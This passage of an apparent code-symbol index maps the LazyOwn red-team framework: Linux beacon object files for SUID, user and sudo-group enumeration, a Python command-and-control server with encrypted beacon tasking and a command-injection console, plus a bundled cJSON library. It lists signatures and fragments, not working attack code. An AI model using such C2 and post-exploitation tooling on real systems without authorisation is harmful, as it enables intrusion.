"line": 75, "name": "flush_output", "signature": "static void flush_output(void)"}, {"kind": "function", "line": 82, "name": "emit", "signature": "static void emit(const char *s)"}, {"doc": "Format `mode` (a st_mode value) into a 10-char permission * string, like ls -l does.", "kind": "function", "line": 105, "name": "format_mode", "signature": "static void format_mode(unsigned int mode, char *out)"}, {"kind": "function", "line": 125, "name": "path_reset", "signature": "static void path_reset(const char *root)"}, {"kind": "function", "line": 134, "name": "path_append", "signature": "static void path_append(const char *name)"}, {"kind": "function", "line": 148, "name": "path_trim_to", "signature": "static void path_trim_to(int len)"}, {"doc": "Walk one directory, recursing into subdirectories. `depth` * bounds the recursion so a symlink loop cannot blow the stack.", "kind": "function", "line": 158, "name": "walk", "signature": "static void walk(int depth)"}, {"kind": "function", "line": 246, "name": "go", "signature": "void go(char *args, int alen)"}, {"kind": "function", "line": 78, "name": "BeaconOutput", "signature": "BeaconOutput(CALLBACK_OUTPUT, out_buf, out_pos);"}, {"kind": "function", "line": 244, "name": "syscall1", "signature": "syscall1(SYS_close, fd);"}, {"kind": "function", "line": 259, "name": "BeaconPrintf", "signature": "BeaconPrintf(CALLBACK_OUTPUT, \"[suid_enum] scanning %s\\n\", root);"}, {"kind": "macro", "line": 26, "name": "SYS_getdents64", "signature": "#define SYS_getdents64"}, {"kind": "macro", "line": 27, "name": "SYS_lstat", "signature": "#define SYS_lstat"}, {"kind": "macro", "line": 30, "name": "DT_UNKNOWN", "signature": "#define DT_UNKNOWN"}, {"kind": "macro", "line": 31, "name": "DT_DIR", "signature": "#define DT_DIR"}, {"kind": "macro", "line": 32, "name": "DT_LNK", "signature": "#define DT_LNK"}]}, {"id": "bof/userenum/bof.c", "kind": "module", "label": "bof.c", "language": "c", "sha256": "8b2e1b27df8ad516", "symbol_count": 5, "symbols": [{"kind": "function", "line": 51, "name": "user_in_member_list", "signature": "static int user_in_member_list(const char *username, const char *members)"}, {"kind": "function", "line": 67, "name": "go", "signature": "void go(char *args, int alen)"}, {"kind": "function", "line": 86, "name": "syscall1", "signature": "syscall1(SYS_close, fd);"}, {"kind": "function", "line": 87, "name": "copy_group_members", "signature": "copy_group_members(\"sudo\", gbuf, total, sudo_members, sizeof(sudo_members));"}, {"kind": "function", "line": 93, "name": "BeaconPrintf", "signature": "BeaconPrintf(CALLBACK_OUTPUT, \"[userenum] cannot open /etc/passwd\\n\");"}]}, {"doc": "is_sudo.c — LazyOwn RedTeam BOF (Linux/x64) gcc -c -nostdlib -fPIC -m64 -O2 userenum.c -o userenum.x64.o define NULL ((void*)0) define CALLBACK_OUTPUT 0  Tipos", "id": "bof/userenum/userenum.c", "kind": "module", "label": "userenum.c", "language": "c", "sha256": "a0465b9f282a7c4f", "symbol_count": 14, "symbols": [{"doc": "Tipos", "kind": "type_alias", "line": 7, "name": "size_t", "signature": "typedef unsigned long size_t;"}, {"kind": "type_alias", "line": 8, "name": "ssize_t", "signature": "typedef long ssize_t;"}, {"doc": "Wrappers", "kind": "function", "line": 21, "name": "syscall3", "signature": "static inline long syscall3(long n, long a1, long a2, long a3)"}, {"doc": "strcmp mínimo (necesario para comparar strings)", "kind": "function", "line": 33, "name": "strcmp", "signature": "static int strcmp(const char *s1, const char *s2)"}, {"kind": "function", "line": 40, "name": "go", "signature": "void go(char *args, int alen)"}, {"doc": "Símbolos del beacon", "kind": "function", "line": 11, "name": "BeaconPrintf", "signature": "extern void BeaconPrintf(int, const char*, ...);"}, {"kind": "function", "line": 12, "name": "BeaconOutput", "signature": "extern void BeaconOutput(int, const char*, int);"}, {"kind": "function", "line": 23, "name": "volatile", "signature": "__asm__ volatile (\"syscall\" : \"=a\"(ret) : \"a\"(n), \"D\"(a1), \"S\"(a2), \"d\"(a3) : \"rcx\", \"r11\", \"memory\" );"}, {"kind": "macro", "line": 3, "name": "NULL", "signature": "#define NULL"}, {"kind": "macro", "line": 4, "name": "CALLBACK_OUTPUT", "signature": "#define CALLBACK_OUTPUT"}, {"kind": "macro", "line": 15, "name": "SYS_openat", "signature": "#define SYS_openat"}, {"kind": "macro", "line": 16, "name": "SYS_read", "signature": "#define SYS_read"}, {"kind": "macro", "line": 17, "name": "SYS_close", "signature": "#define SYS_close"}, {"kind": "macro", "line": 18, "name": "AT_FDCWD", "signature": "#define AT_FDCWD"}]}, {"id": "bof/whoami/bof.c", "kind": "module", "label": "bof.c", "language": "c", "sha256": "4fd7e517b89619b6", "symbol_count": 3, "symbols": [{"doc": "BeaconPrintf/BeaconOutput are declared in beacon_api.h, which the * beacon's loader resolves by symbol name.", "kind": "function", "line": 18, "name": "go", "signature": "void go(char *args, int alen)"}, {"kind": "function", "line": 30, "name": "BeaconPrintf", "signature": "BeaconPrintf(CALLBACK_OUTPUT, \"[whoami] uid=0 (root)\\n\");"}, {"kind": "function", "line": 31, "name": "BeaconOutput", "signature": "BeaconOutput(CALLBACK_OUTPUT, \"root\", 0);"}]}, {"doc": "whoami.c — LazyOwn RedTeam BOF (Linux/x64) define NULL ((void*)0) define CALLBACK_OUTPUT 0  Tipos", "id": "bof/whoami/whoami.c", "kind": "module", "label": "whoami.c", "language": "c", "sha256": "b985bfdcc7feefc6", "symbol_count": 15, "symbols": [{"doc": "Tipos", "kind": "type_alias", "line": 6, "name": "size_t", "signature": "typedef unsigned long size_t;"}, {"kind": "type_alias", "line": 7, "name": "ssize_t", "signature": "typedef long ssize_t;"}, {"doc": "Syscall wrappers", "kind": "function", "line": 21, "name": "syscall3", "signature": "static inline long syscall3(long n, long a1, long a2, long a3)"}, {"kind": "function", "line": 30, "name": "syscall1", "signature": "static inline long syscall1(long n, long a1)"}, {"kind": "function", "line": 40, "name": "go", "signature": "void go(char *args, int alen)"}, {"doc": "Símbolos del beacon", "kind": "function", "line": 10, "name": "BeaconPrintf", "signature": "extern void BeaconPrintf(int, const char*, ...);"}, {"kind": "function", "line": 11, "name": "BeaconOutput", "signature": "extern void BeaconOutput(int, const char*, int);"}, {"kind": "function", "line": 23, "name": "volatile", "signature": "__asm__ volatile (\"syscall\" : \"=a\"(ret) : \"a\"(n), \"D\"(a1), \"S\"(a2), \"d\"(a3) : \"rcx\", \"r11\", \"memory\" );"}, {"kind": "macro", "line": 2, "name": "NULL", "signature": "#define NULL"}, {"kind": "macro", "line": 3, "name": "CALLBACK_OUTPUT", "signature": "#define CALLBACK_OUTPUT"}, {"kind": "macro", "line": 14, "name": "SYS_openat", "signature": "#define SYS_openat"}, {"kind": "macro", "line": 15, "name": "SYS_read", "signature": "#define SYS_read"}, {"kind": "macro", "line": 16, "name": "SYS_close", "signature": "#define SYS_close"}, {"kind": "macro", "line": 17, "name": "SYS_getuid", "signature": "#define SYS_getuid"}, {"kind": "macro", "line": 18, "name": "AT_FDCWD", "signature": "#define AT_FDCWD"}]}, {"doc": "bof.c include \"beacon.h\"  // ← Incluir la API", "id": "bof.c", "kind": "module", "label": "bof.c", "language": "c", "sha256": "cd979c9a981c76e1", "symbol_count": 2, "symbols": [{"doc": "bof.c include \"beacon.h\"  // ← Incluir la API", "kind": "function", "line": 3, "name": "__attribute__", "signature": "__attribute__((used))\n__attribute__((visibility(\"default\")))\nvoid go(char *args, int alen)"}, {"kind": "function", "line": 7, "name": "BeaconPrintf", "signature": "BeaconPrintf(CALLBACK_OUTPUT, \"[TEST BOF] Somehow, I'm still alive. Args=%.*s\\n\", alen, args);"}]}, {"id": "c2/server.py", "kind": "module", "label": "server.py", "language": "py", "sha256": "ccf8267650a12974", "symbol_count": 14, "symbols": [{"doc": "Load configuration from JSON file or use defaults.", "kind": "function", "line": 59, "name": "load_runtime_config", "signature": "def load_runtime_config()"}, {"doc": "Compute HMAC-SHA256 for message authentication.", "kind": "function", "line": 86, "name": "compute_hmac", "signature": "def compute_hmac(key, data)"}, {"doc": "Verify HMAC-SHA256 signature.", "kind": "function", "line": 91, "name": "verify_hmac", "signature": "def verify_hmac(key, data, signature)"}, {"doc": "Encrypt data with AES-256-CFB and optional HMAC.", "kind": "function", "line": 97, "name": "encrypt_data", "signature": "def encrypt_data(data, key, use_hmac)"}, {"doc": "Decrypt AES-256-CFB data with optional HMAC verification.", "kind": "function", "line": 117, "name": "decrypt_data", "signature": "def decrypt_data(b64_data, key, use_hmac)"}, {"doc": "Mutable state shared between request handlers.", "kind": "class", "line": 136, "name": "C2State", "signature": "class C2State"}, {"doc": "Dispatch beacon's polling GET request.", "kind": "method", "line": 150, "name": "handle_get_command", "signature": "def handle_get_command(state, selector)"}, {"doc": "Process beacon result report.", "kind": "method", "line": 173, "name": "handle_report", "signature": "def handle_report(state, b64_payload)"}, {"doc": "Serve BOF file from upload directory.", "kind": "method", "line": 229, "name": "handle_bof", "signature": "def handle_bof(state, name)"}, {"doc": "Route request to appropriate handler.", "kind": "method", "line": 239, "name": "handle_request", "signature": "def handle_request(state, selector)"}, {"doc": "Handle individual client connection.", "kind": "method", "line": 272, "name": "serve_client", "signature": "def serve_client(state, conn, addr)"}, {"doc": "Interactive command injection REPL.", "kind": "method", "line": 294, "name": "command_injector", "signature": "def command_injector(state)"}, {"doc": "Start C2 server.", "kind": "method", "line": 317, "name": "main", "signature": "def main()"}, {"kind": "method", "line": 139, "name": "__init__", "signature": "def __init__(self, cfg)"}]}, {"id": "cJSON.c", "kind": "module", "label": "cJSON.c", "language": "c", "sha256": "0c6e74c82b3fa090", "symbol_count": 140, "symbols": [{"kind": "struct", "line": 157, "name": "internal_hooks"}, {"kind": "struct", "line": 88, "name": "error"}, {"kind": "struct", "line": 291, "name": "parse_buffer"}, {"kind": "struct", "line": 482, "name": "printbuffer"}, {"kind": "function", "line": 94, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(const char *) cJSON_GetErrorPtr(void)"}, {"kind": "function", "line": 99, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(char *) cJSON_GetStringValue(const cJSON * const item)"}, {"kind": "function", "line": 109, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item)"}, {"doc": "CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item) { if (!cJSON_IsNumber(item)) { return (double) NAN; } return item->valuedouble; } /* This is a safeguard to prevent copy-pasters from using incompatible C and header files if (CJSON_VERSION_MAJOR != 1) || (CJSON_VERSION_MINOR != 7) || (CJSON_VERSION_PATCH != 18) error cJSON.h and cJSON.c have different versions. Make sure that both have the same. endif", "kind": "function", "line": 124, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(const char*) cJSON_Version(void)"}, {"doc": "/* This is a safeguard to prevent copy-pasters from using incompatible C and header files #if (CJSON_VERSION_MAJOR != 1) || (CJSON_VERSION_MINOR != 7) || (CJSON_VERSION_PATCH != 18) #error cJSON.h and cJSON.c have different versions. Make sure that both have the same. #endif CJSON_PUBLIC(const char*) cJSON_Version(void) { static char version[15]; sprintf(version, \"%i.%i.%i\", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH); return version; } /* Case insensitive string comparison, doesn't consider two NULL pointers equal though", "kind": "function", "line": 134, "name": "case_insensitive_strcmp", "signature": "static int case_insensitive_strcmp(const unsigned char *string1, const unsigned char *string2)"}, {"doc": "} return tolower(*string1) - tolower(*string2); } typedef struct internal_hooks { void *(CJSON_CDECL *allocate)(size_t size); void (CJSON_CDECL *deallocate)(void *pointer); void *(CJSON_CDECL *reallocate)(void *pointer, size_t size); } internal_hooks; #if defined(_MSC_VER) /* work around MSVC error C2322: '...' address of dllimport '...' is not static", "kind": "function", "line": 166, "name": "internal_malloc", "signature": "static void * CJSON_CDECL internal_malloc(size_t size)"}, {"kind": "function", "line": 170, "name": "internal_free", "signature": "static void CJSON_CDECL internal_free(void *pointer)"}, {"kind": "function", "line": 174, "name": "internal_realloc", "signature": "static void * CJSON_CDECL internal_realloc(void *pointer, size_t size)"}, {"kind": "function", "line": 188, "name": "cJSON_strdup", "signature": "static unsigned char* cJSON_strdup(const unsigned char* string, const internal_hooks * const hooks)"}, {"kind": "function", "line": 209, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(void) cJSON_InitHooks(cJSON_Hooks* hooks)"}, {"doc": "if (hooks->free_fn != NULL) { global_hooks.deallocate = hooks->free_fn; } /* use realloc only if both free and malloc are used global_hooks.reallocate = NULL; if ((global_hooks.allocate == malloc) && (global_hooks.deallocate == free)) { global_hooks.reallocate = realloc; } } /* Internal constructor.", "kind": "function", "line": 242, "name": "cJSON_New_Item", "signature": "static cJSON *cJSON_New_Item(const internal_hooks * const hooks)"}, {"doc": "item->valuestring = NULL; } if (!(item->type & cJSON_StringIsConst) && (item->string != NULL)) { global_hooks.deallocate(item->string); item->string = NULL; } global_hooks.deallocate(item); item = next; } } /* get the decimal point character of the current locale", "kind": "function", "line": 281, "name": "get_decimal_point", "signature": "static unsigned char get_decimal_point(void)"}, {"doc": "size_t offset; size_t depth; /* How deeply nested (in arrays/objects) is the input at the current offset. internal_hooks hooks; } parse_buffer; /* check if the given size is left to read in a given parse buffer (starting with 1) #define can_read(buffer, size) ((buffer != NULL) && (((buffer)->offset + size) <= (buffer)->length)) /* check if the buffer can be accessed at the given index (starting with 0) #define can_access_at_index(buffer, index) ((buffer != NULL) && (((buffer)->offset + index) < (buffer)->length)) #define cannot_access_at_index(buffer, index) (!can_access_at_index(buffer, index)) /* get a pointer to the buffer at the position #define buffer_at_offset(buffer) ((buffer)->content + (buffer)->offset) /* Parse the input text to generate a number, and populate the result into item.", "kind": "function", "line": 309, "name": "parse_number", "signature": "static cJSON_bool parse_number(cJSON * const item, parse_buffer * const input_buffer)"}, {"doc": "} typedef struct { unsigned char *buffer; size_t length; size_t offset; size_t depth; /* current nesting depth (for formatted printing) cJSON_bool noalloc; cJSON_bool format; /* is this print a formatted print internal_hooks hooks; } printbuffer; /* realloc printbuffer if necessary to have at least \"needed\" bytes more", "kind": "function", "line": 494, "name": "ensure", "signature": "static unsigned char* ensure(printbuffer * const p, size_t needed)"}, {"doc": "p->buffer = NULL; return NULL; } memcpy(newbuffer, p->buffer, p->offset + 1); p->hooks.deallocate(p->buffer); } p->length = newsize; p->buffer = newbuffer; return newbuffer + p->offset; } /* calculate the new length of the string in a printbuffer and update the offset", "kind": "function", "line": 579, "name": "update_offset", "signature": "static void update_offset(printbuffer * const buffer)"}, {"doc": "/* calculate the new length of the string in a printbuffer and update the offset static void update_offset(printbuffer * const buffer) { const unsigned char *buffer_pointer = NULL; if ((buffer == NULL) || (buffer->buffer == NULL)) { return; } buffer_pointer = buffer->buffer + buffer->offset; buffer->offset += strlen((const char*)buffer_pointer); } /* securely comparison of floating-point variables", "kind": "function", "line": 592, "name": "compare_double", "signature": "static cJSON_bool compare_double(double a, double b)"}, {"doc": "} buffer_pointer = buffer->buffer + buffer->offset; buffer->offset += strlen((const char*)buffer_pointer); } /* securely comparison of floating-point variables static cJSON_bool compare_double(double a, double b) { double maxVal = fabs(a) > fabs(b) ? fabs(a) : fabs(b); return (fabs(a - b) <= maxVal * DBL_EPSILON); } /* Render the number nicely from the given item into a string.", "kind": "function", "line": 599, "name": "print_number", "signature": "static cJSON_bool print_number(const cJSON * const item, printbuffer * const output_buffer)"}, {"doc": "output_pointer[i] = '.'; continue; } output_pointer[i] = number_buffer[i]; } output_pointer[i] = '\\0'; output_buffer->offset += (size_t)length; return true; } /* parse 4 digit hexadecimal number", "kind": "function", "line": 669, "name": "parse_hex4", "signature": "static unsigned parse_hex4(const unsigned char * const input)"}, {"doc": "converts a UTF-16 literal to UTF-8 * A literal can be one or two sequences of the form \\uXXXX", "kind": "function", "line": 706, "name": "utf16_literal_to_utf8", "signature": "static unsigned char utf16_literal_to_utf8(const unsigned char * const input_pointer, const unsig..."}, {"doc": "else { (*output_pointer)[0] = (unsigned char)(codepoint & 0x7F); } output_pointer += utf8_length; return sequence_length; fail: return 0; } /* Parse the input text into an unescaped cinput, and populate item.", "kind": "function", "line": 827, "name": "parse_string", "signature": "static cJSON_bool parse_string(cJSON * const item, parse_buffer * const input_buffer)"}, {"doc": "{ input_buffer->hooks.deallocate(output); output = NULL; } if (input_pointer != NULL) { input_buffer->offset = (size_t)(input_pointer - input_buffer->content); } return false; } /* Render the cstring provided to an escaped version that can be printed.", "kind": "function", "line": 957, "name": "print_string_ptr", "signature": "static cJSON_bool print_string_ptr(const unsigned char * const input, printbuffer * const output_..."}, {"doc": "/* escape and print as unicode codepoint sprintf((char*)output_pointer, \"u%04x\", *input_pointer); output_pointer += 4; break; } } } output[output_length + 1] = '\"'; output[output_length + 2] = '\\0'; return true; } /* Invoke print_string_ptr (which is useful) on an item.", "kind": "function", "line": 1079, "name": "print_string", "signature": "static cJSON_bool print_string(const cJSON * const item, printbuffer * const p)"}, {"doc": "static cJSON_bool print_string(const cJSON * const item, printbuffer * const p) { return print_string_ptr((unsigned char*)item->valuestring, p); } /* Predeclare these prototypes. static cJSON_bool parse_value(cJSON * const item, parse_buffer * const input_buffer); static cJSON_bool print_value(const cJSON * const item, printbuffer * const output_buffer); static cJSON_bool parse_array(cJSON * const item, parse_buffer * const input_buffer); static cJSON_bool print_array(const cJSON * const item, printbuffer * const output_buffer); static cJSON_bool parse_object(cJSON * const item, parse_buffer * const input_buffer); static cJSON_bool print_object(const cJSON * const item, printbuffer * const output_buffer); /* Utility to jump whitespace and cr/lf", "kind": "function", "line": 1093, "name": "buffer_skip_whitespace", "signature": "static parse_buffer *buffer_skip_whitespace(parse_buffer * const buffer)"}, {"doc": "while (can_access_at_index(buffer, 0) && (buffer_at_offset(buffer)[0] <= 32)) { buffer->offset++; } if (buffer->offset == buffer->length) { buffer->offset--; } return buffer; } /* skip the UTF-8 BOM (byte order mark) if it is at the beginning of a buffer", "kind": "function", "line": 1119, "name": "skip_utf8_bom", "signature": "static parse_buffer *skip_utf8_bom(parse_buffer * const buffer)"}, {"kind": "function", "line": 1133, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_ParseWithOpts(const char *value, const char **return_parse_end, cJSON..."}, {"kind": "function", "line": 1235, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_ParseWithLength(const char *value, size_t buffer_length)"}, {"doc": "define cjson_min(a, b) (((a) < (b)) ? (a) : (b))", "kind": "function", "line": 1242, "name": "print", "signature": "static unsigned char *print(const cJSON * const item, cJSON_bool format, const internal_hooks * c..."}, {"kind": "function", "line": 1315, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(char *) cJSON_PrintUnformatted(const cJSON *item)"}, {"kind": "function", "line": 1320, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(char *) cJSON_PrintBuffered(const cJSON *item, int prebuffer, cJSON_bool fmt)"}, {"kind": "function", "line": 1351, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_PrintPreallocated(cJSON *item, char *buffer, const int length, con..."}, {"doc": "return false; } p.buffer = (unsigned char*)buffer; p.length = (size_t)length; p.offset = 0; p.noalloc = true; p.format = format; p.hooks = global_hooks; return print_value(item, &p); } /* Parser core - when encountering text, process appropriately.", "kind": "function", "line": 1372, "name": "parse_value", "signature": "static cJSON_bool parse_value(cJSON * const item, parse_buffer * const input_buffer)"}, {"doc": "if (can_access_at_index(input_buffer, 0) && (buffer_at_offset(input_buffer)[0] == '[')) { return parse_array(item, input_buffer); } /* object if (can_access_at_index(input_buffer, 0) && (buffer_at_offset(input_buffer)[0] == '{')) { return parse_object(item, input_buffer); } return false; } /* Render a value to text.", "kind": "function", "line": 1427, "name": "print_value", "signature": "static cJSON_bool print_value(const cJSON * const item, printbuffer * const output_buffer)"}, {"doc": "return print_string(item, output_buffer); case cJSON_Array: return print_array(item, output_buffer); case cJSON_Object: return print_object(item, output_buffer); default: return false; } } /* Build an array from input text.", "kind": "function", "line": 1501, "name": "parse_array", "signature": "static cJSON_bool parse_array(cJSON * const item, parse_buffer * const input_buffer)"}, {"doc": "input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an array to text", "kind": "function", "line": 1599, "name": "print_array", "signature": "static cJSON_bool print_array(const cJSON * const item, printbuffer * const output_buffer)"}, {"doc": "output_pointer = ensure(output_buffer, 2); if (output_pointer == NULL) { return false; } output_pointer++ = ']'; output_pointer = '\\0'; output_buffer->depth--; return true; } /* Build an object from the text.", "kind": "function", "line": 1661, "name": "parse_object", "signature": "static cJSON_bool parse_object(cJSON * const item, parse_buffer * const input_buffer)"}, {"doc": "input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an object to text.", "kind": "function", "line": 1780, "name": "print_object", "signature": "static cJSON_bool print_object(const cJSON * const item, printbuffer * const output_buffer)"}, {"kind": "function", "line": 1915, "name": "get_array_item", "signature": "static cJSON* get_array_item(const cJSON *array, size_t index)"}, {"kind": "function", "line": 1934, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_GetArrayItem(const cJSON *array, int index)"}, {"kind": "function", "line": 1944, "name": "get_object_item", "signature": "static cJSON *get_object_item(const cJSON * const object, const char * const name, const cJSON_bo..."}, {"kind": "function", "line": 1976, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_GetObjectItem(const cJSON * const object, const char * const string)"}, {"kind": "function", "line": 1981, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * const object, const char * c..."}, {"kind": "function", "line": 1986, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string)"}, {"doc": "return get_object_item(object, string, false); } CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * const object, const char * const string) { return get_object_item(object, string, true); } CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string) { return cJSON_GetObjectItem(object, string) ? 1 : 0; } /* Utility for array list handling.", "kind": "function", "line": 1993, "name": "suffix_object", "signature": "static void suffix_object(cJSON *prev, cJSON *item)"}, {"doc": "CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string) { return cJSON_GetObjectItem(object, string) ? 1 : 0; } /* Utility for array list handling. static void suffix_object(cJSON *prev, cJSON *item) { prev->next = item; item->prev = prev; } /* Utility for handling references.", "kind": "function", "line": 2000, "name": "create_reference", "signature": "static cJSON *create_reference(const cJSON *item, const internal_hooks * const hooks)"}, {"kind": "function", "line": 2020, "name": "add_item_to_array", "signature": "static cJSON_bool add_item_to_array(cJSON *array, cJSON *item)"}, {"doc": "/* Add item to array/object. CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToArray(cJSON *array, cJSON *item) { return add_item_to_array(array, item); } #if defined(__clang__) || (defined(__GNUC__) && ((__GNUC__ > 4) || ((__GNUC__ == 4) && (__GNUC__-MINOR__ > 5)))) #pragma GCC diagnostic push #endif #ifdef __GNUC__ #pragma GCC diagnostic ignored \"-Wcast-qual\" #endif /* helper function to cast away const", "kind": "function", "line": 2066, "name": "cast_away_const", "signature": "static void* cast_away_const(const void* string)"}, {"doc": "if defined(__clang__) || (defined(__GNUC__) && ((__GNUC__ > 4) || ((__GNUC__ == 4) && (__GNUC__-MINOR__ > 5)))) pragma GCC diagnostic pop endif", "kind": "function", "line": 2073, "name": "add_item_to_object", "signature": "static cJSON_bool add_item_to_object(cJSON * const object, const char * const string, cJSON * con..."}, {"kind": "function", "line": 2111, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToObject(cJSON *object, const char *string, cJSON *item)"}, {"kind": "function", "line": 2122, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToArray(cJSON *array, cJSON *item)"}, {"kind": "function", "line": 2132, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToObject(cJSON *object, const char *string, cJSON ..."}, {"kind": "function", "line": 2142, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddNullToObject(cJSON * const object, const char * const name)"}, {"kind": "function", "line": 2154, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddTrueToObject(cJSON * const object, const char * const name)"}, {"kind": "function", "line": 2166, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddFalseToObject(cJSON * const object, const char * const name)"}, {"kind": "function", "line": 2178, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddBoolToObject(cJSON * const object, const char * const name, const c..."}, {"kind": "function", "line": 2190, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddNumberToObject(cJSON * const object, const char * const name, const..."}, {"kind": "function", "line": 2202, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddStringToObject(cJSON * const object, const char * const name, const..."}, {"kind": "function", "line": 2214, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddRawToObject(cJSON * const object, const char * const name, const ch..."}, {"kind": "function", "line": 2226, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddObjectToObject(cJSON * const object, const char * const name)"}, {"kind": "function", "line": 2238, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddArrayToObject(cJSON * const object, const char * const name)"}, {"kind": "function", "line": 2250, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_DetachItemViaPointer(cJSON *parent, cJSON * const item)"}, {"kind": "function", "line": 2286, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromArray(cJSON *array, int which)"}, {"kind": "function", "line": 2296, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(void) cJSON_DeleteItemFromArray(cJSON *array, int which)"}, {"kind": "function", "line": 2301, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObject(cJSON *object, const char *string)"}, {"kind": "function", "line": 2308, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObjectCaseSensitive(cJSON *object, const char *string)"}, {"kind": "function", "line": 2315, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(void) cJSON_DeleteItemFromObject(cJSON *object, const char *string)"}, {"kind": "function", "line": 2320, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(void) cJSON_DeleteItemFromObjectCaseSensitive(cJSON *object, const char *string)"}, {"kind": "function", "line": 2362, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemViaPointer(cJSON * const parent, cJSON * const item, cJ..."}, {"kind": "function", "line": 2412, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInArray(cJSON *array, int which, cJSON *newitem)"}, {"kind": "function", "line": 2422, "name": "replace_item_in_object", "signature": "static cJSON_bool replace_item_in_object(cJSON *object, const char *string, cJSON *replacement, c..."}, {"kind": "function", "line": 2445, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObject(cJSON *object, const char *string, cJSON *newi..."}, {"kind": "function", "line": 2450, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObjectCaseSensitive(cJSON *object, const char *string..."}, {"kind": "function", "line": 2467, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateTrue(void)"}, {"kind": "function", "line": 2478, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateFalse(void)"}, {"kind": "function", "line": 2489, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateBool(cJSON_bool boolean)"}, {"kind": "function", "line": 2500, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateNumber(double num)"}, {"kind": "function", "line": 2525, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateString(const char *string)"}, {"kind": "function", "line": 2542, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateStringReference(const char *string)"}, {"kind": "function", "line": 2554, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateObjectReference(const cJSON *child)"}, {"kind": "function", "line": 2566, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateArrayReference(const cJSON *child)"}, {"kind": "function", "line": 2578, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateRaw(const char *raw)"}, {"kind": "function", "line": 2595, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateArray(void)"}, {"kind": "function", "line": 2606, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateObject(void)"}, {"kind": "function", "line": 2658, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateFloatArray(const float *numbers, int count)"}, {"kind": "function", "line": 2698, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateDoubleArray(const double *numbers, int count)"}, {"kind": "function", "line": 2738, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) 